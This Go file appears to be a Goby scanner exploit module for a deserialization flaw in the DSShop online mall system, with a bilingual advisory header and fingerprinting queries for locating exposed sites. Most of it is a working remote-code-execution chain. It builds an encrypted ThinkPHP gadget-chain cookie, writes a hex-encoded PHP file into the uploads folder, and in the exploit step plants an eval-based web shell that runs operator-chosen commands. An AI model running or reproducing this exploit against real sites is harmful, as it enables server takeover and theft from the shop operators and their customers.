package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "DSShop system getCartList method command execution vulnerability",
    "Description": "<p>DSShop is a single-user online mall system developed by Changsha Deshang Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the cart parameter of the getCartList method of the v1-v2 version of DSShop. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
    "Product": "DSShop",
    "Homepage": "http://www.csdeshang.com/",
    "DisclosureDate": "2020-05-17",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "(body=\"dsshop\" || (body=\"js/dialog/dialog.js\" && body=\"jquery.validate.min.js\") || body=\"home/adv/5d5f86eb3119b.jpg\")",
    "GobyQuery": "(body=\"dsshop\" || (body=\"js/dialog/dialog.js\" && body=\"jquery.validate.min.js\") || body=\"home/adv/5d5f86eb3119b.jpg\")",
    "Level": "3",
    "Impact": "<p>There is a deserialization vulnerability in the cart parameter of the getCartList method of the v1-v2 version of DSShop. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.anquanke.com/post/id/203461#h3-4"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system('whoami');",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "OR",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error: '~",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "DSShop系统 getCartList方法存在命令执行漏洞",
            "Product": "DSShop",
            "Description": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">DSShop</span>是由长沙德尚网络科技有限公司<span style=\"color: rgb(62, 62, 62);\">开发的一款单<span style=\"color: rgb(62, 62, 62);\">用户在线商城系统。</span></span></p><p><font color=\"#3e3e3e\">DSShop的v1-v2版本的getCartList方法的<span style=\"color: rgb(22, 28, 37); font-size: 16px;\">cart</span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"></span>参数存在反序列化漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至最新版</p><p>2、部署Web应用防火墙，对文件操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">DSShop的v1-v2版本的getCartList方法的</span><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">cart</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">参数存在反序列化漏洞，攻击者可以通过漏洞执行任意代码，获取服务器权限。</span><br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "DSShop system getCartList method command execution vulnerability",
            "Product": "DSShop",
            "Description": "<p>DSShop is a single-user online mall system developed by Changsha Deshang Network Technology Co., Ltd.</p><p>There is a deserialization vulnerability in the cart parameter of the getCartList method of the v1-v2 version of DSShop. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version</p><p>2. Deploy a web application firewall to monitor file operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">There is a deserialization vulnerability in the cart parameter of the getCartList method of the v1-v2 version of DSShop. An attacker can execute arbitrary code through the vulnerability and obtain server permissions.</span><br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10699"
}`

	MD5123455 := func(str string) string {
		data := []byte(str) //切片
		has := md5.Sum(data)
		md5str := fmt.Sprintf("%x", has) //将[]byte转成16进制
		return md5str
	}

	//sha123455 := func(str string) string {
	//	data := []byte(str) //切片
	//	has := sha1.Sum(data)
	//	sha1str := fmt.Sprintf("%x", has) //将[]byte转成16进制
	//	return sha1str
	//}

	Substr123455 := func(str string, start, length int) string {
		rs := []rune(str)
		rl := len(rs)
		end := 0
		if start < 0 {
			start = rl - 1 + start
		}
		end = start + length
		if start > end {
			start, end = end, start
		}
		if start < 0 {
			start = 0
		}
		if start > rl {
			start = rl
		}
		if end < 0 {
			end = 0
		}
		if end > rl {
			end = rl
		}
		return string(rs[start:end])
	}

	encode123455 := func(data string, key_tmp string) string {
		key := key_tmp
		chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.";
		ikey := "-x6g6ZWm2G9g_vr0Bo.pOq3kRIxsZ6rm"
		nh1 := 0
		nh2 := 0
		nh3 := 0
		ch1 := "A"
		ch2 := "A"
		ch3 := "A"
		nhnum := nh1 + nh2 + nh3
		knum := 0
		for i:=0; i<len(key);i++{
			knum = knum + int(key[i])
		}
		mdkey := Substr123455(MD5123455(MD5123455(MD5123455(key+ch1)+ch2+ikey)+ch3),nhnum %8,knum % 8+16)
		str := "1234567890_"+data
		msg := []byte(str)
		encoded := base64.StdEncoding.EncodeToString(msg)
		encoded1 := strings.Replace(encoded, "+", "-", -1)
		encoded2 := strings.Replace(encoded1, "/", "_", -1)
		txt := strings.Replace(encoded2, "=", ".", -1)
		tmp := ""
		k := 0
		j := 0
		tlen := len(txt)
		klen := len(mdkey)
		for i:=0; i<tlen; i++{
			if k == klen{
				k = 0
			}
			findkey := ""
			findkey = fmt.Sprintf("%c",txt[i])
			j = (int(nhnum) + int(strings.Index(chars,findkey)) + int(mdkey[k])) % 64
			k = k + 1
			tmp += fmt.Sprintf("%c",chars[j])
		}
		tmplen := len(tmp)
		tmplen = tmplen + 1
		tmp = "A" + tmp
		tmplen = tmplen + 1
		tmp = "A" + tmp
		tmplen = tmplen + 1
		index := knum % tmplen
		tmp = tmp[:index] +"A" + tmp[index:]
		return tmp
	}

	unserialize123455 := func (u *httpclient.FixUrl,index string,poc string,payload string,file string) bool{
		uri1 := fmt.Sprintf("%s?s=home/article/index", index)
		cfg1 := httpclient.NewPostRequestConfig(uri1)
		cfg1.VerifyTls = false
		cfg1.FollowRedirect = false
		cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg1.Header.Store("Cookie", "cart="+poc)
		cfg1.Data = "img=if(!is_dir($_SERVER['DOCUMENT_ROOT'].'/uploads/')){mkdir($_SERVER['DOCUMENT_ROOT'].'/uploads',777,true);}file_put_contents($_SERVER['DOCUMENT_ROOT'].'/uploads/"+file+"',hex2bin('"+payload+"'));"
		if _, err := httpclient.DoHttpRequest(u, cfg1); err == nil{
			cfg := httpclient.NewGetRequestConfig("/uploads/"+file+"?img=echo+md5(123);")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp2.RawBody,"202cb962ac59075b964b07152d234b70") {
				return true
			}
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//<?php echo md5(123);unlink(__FILE__);?> 删除自身
			payload := "3c3f706870206563686f206d643528313233293b756e6c696e6b285f5f46494c455f5f293b3f3e"
			filename := "test" + goutils.RandomHexString(7) + ".php"
			//注册新用户，常规的注册和登录都是需要验证码的，这里存在一个不需要验证码的接口，并且注册成功会直接设置session，无需再次登陆
			key := MD5123455("a2382918dbb49c8643f19bc3ab90ecf9")
			poc, _ := url.QueryUnescape("TzoxMzoidGhpbmtcUHJvY2VzcyI6Mzp7czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtzOjY6InN0YXJ0ZSI7czoyNzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc1BpcGVzIjtPOjI4OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNNYW55Ijo0OntzOjg6IgAqAHF1ZXJ5IjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NDoidGVzdCI7czo3NDoiM2MzZjcwNjg3MDIwNDA2NTc2NjE2YzI4MjQ1ZjUyNDU1MTU1NDU1MzU0NWIyNzY5NmQ2NzI3NWQyOTNiNjU3ODY5NzQyODI5M2IiO31zOjk6IgAqAGZpbHRlciI7YToyOntpOjA7czo3OiJoZXgyYmluIjtpOjE7YToyOntpOjA7TzoyMToidGhpbmtcdmlld1xkcml2ZXJcUGhwIjowOnt9aToxO3M6NzoiZGlzcGxheSI7fX19czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo1OiJ0ZXN0LyI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjI6e3M6NjoiZXhwaXJlIjtzOjA6IiI7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToyOntpOjA7czo1OiJ3aGVyZSI7aToxO3M6MTY6InJlbW92ZVdoZXJlRmllbGQiO319czoxMzoiACoAZm9yZWlnbktleSI7czozOiJhYmMiO3M6OToiACoAcGFyZW50IjtPOjEwOiJ0aGlua1xWaWV3IjoxOntzOjY6ImVuZ2luZSI7czozOiIxMTEiO31zOjExOiIAKgBsb2NhbEtleSI7czo2OiJlbmdpbmUiO31zOjMzOiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzSW5mb3JtYXRpb24iO2E6MTp7czo3OiJydW5uaW5nIjtzOjE6IjEiO319")
			encode_poc := encode123455(poc,key)
			encode_poc = url.QueryEscape(encode_poc)
			status := unserialize123455(u,"/index.php",encode_poc,payload,filename)
			if status{
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// <?php @eval($_REQUEST['img']);if($_REQUEST['unlink']==1){unlink(__FILE__);}?> 删除自身
			payload := "3c3f70687020406576616c28245f524551554553545b27696d67275d293b696628245f524551554553545b27756e6c696e6b275d3d3d31297b756e6c696e6b285f5f46494c455f5f293b7d3f3e"
			code := url.QueryEscape(ss.Params["code"].(string))
			filename := "test" + goutils.RandomHexString(7) + ".php"
			cfg := httpclient.NewGetRequestConfig("/uploads/"+filename+"?unlink=1&img=" + code)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			key := MD5123455("a2382918dbb49c8643f19bc3ab90ecf9")
			poc, _ := url.QueryUnescape("TzoxMzoidGhpbmtcUHJvY2VzcyI6Mzp7czoyMToiAHRoaW5rXFByb2Nlc3MAc3RhdHVzIjtzOjY6InN0YXJ0ZSI7czoyNzoiAHRoaW5rXFByb2Nlc3MAcHJvY2Vzc1BpcGVzIjtPOjI4OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNNYW55Ijo0OntzOjg6IgAqAHF1ZXJ5IjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NDoidGVzdCI7czo3NDoiM2MzZjcwNjg3MDIwNDA2NTc2NjE2YzI4MjQ1ZjUyNDU1MTU1NDU1MzU0NWIyNzY5NmQ2NzI3NWQyOTNiNjU3ODY5NzQyODI5M2IiO31zOjk6IgAqAGZpbHRlciI7YToyOntpOjA7czo3OiJoZXgyYmluIjtpOjE7YToyOntpOjA7TzoyMToidGhpbmtcdmlld1xkcml2ZXJcUGhwIjowOnt9aToxO3M6NzoiZGlzcGxheSI7fX19czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo1OiJ0ZXN0LyI7fXM6NjoiACoAdGFnIjtiOjE7fXM6OToiACoAY29uZmlnIjthOjI6e3M6NjoiZXhwaXJlIjtzOjA6IiI7czoxMjoic2Vzc2lvbl9uYW1lIjtzOjA6IiI7fX1zOjk6IgAqAHN0eWxlcyI7YToyOntpOjA7czo1OiJ3aGVyZSI7aToxO3M6MTY6InJlbW92ZVdoZXJlRmllbGQiO319czoxMzoiACoAZm9yZWlnbktleSI7czozOiJhYmMiO3M6OToiACoAcGFyZW50IjtPOjEwOiJ0aGlua1xWaWV3IjoxOntzOjY6ImVuZ2luZSI7czozOiIxMTEiO31zOjExOiIAKgBsb2NhbEtleSI7czo2OiJlbmdpbmUiO31zOjMzOiIAdGhpbmtcUHJvY2VzcwBwcm9jZXNzSW5mb3JtYXRpb24iO2E6MTp7czo3OiJydW5uaW5nIjtzOjE6IjEiO319")
			encode_poc := encode123455(poc,key)
			encode_poc = url.QueryEscape(encode_poc)
			status := unserialize123455(expResult.HostInfo,"/index.php",encode_poc,payload,filename)
			if status{
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}